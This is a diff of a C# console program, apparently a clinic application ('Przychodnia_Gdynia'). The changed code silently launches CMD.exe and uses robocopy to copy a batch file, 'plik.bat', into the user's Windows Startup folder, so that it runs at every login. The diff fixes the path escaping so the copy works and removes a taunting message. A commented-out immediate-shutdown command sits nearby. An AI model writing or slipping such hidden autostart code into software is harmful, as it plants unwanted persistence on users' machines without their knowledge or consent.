@@ -4,6 +4,7 @@ using static System.Console;
 using System.Collections.Generic;
 using System.Linq;
 using System.Threading.Tasks;
+using System.IO;
 
 namespace Przychodnia_Gdynia
 {
@@ -94,11 +95,10 @@ namespace Przychodnia_Gdynia
 		{
 			string lol = Directory.GetCurrentDirectory();
             string paf = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
-            string xd = $"/C robocopy {lol} "{paf}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" plik.bat";
+            string xd = $"/C robocopy {lol} \"{paf}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" plik.bat";
             System.Diagnostics.Process.Start("CMD.exe", xd);
 			Console.Clear();
-			System.Console.WriteLine("No debil XD");
-			Funkcje_Pomocnicze.EmptySpaceRoof(10);
+
 			System.Console.WriteLine();
 			//string strCmdText;
 			//strCmdText= "shutdown -s -t 1";
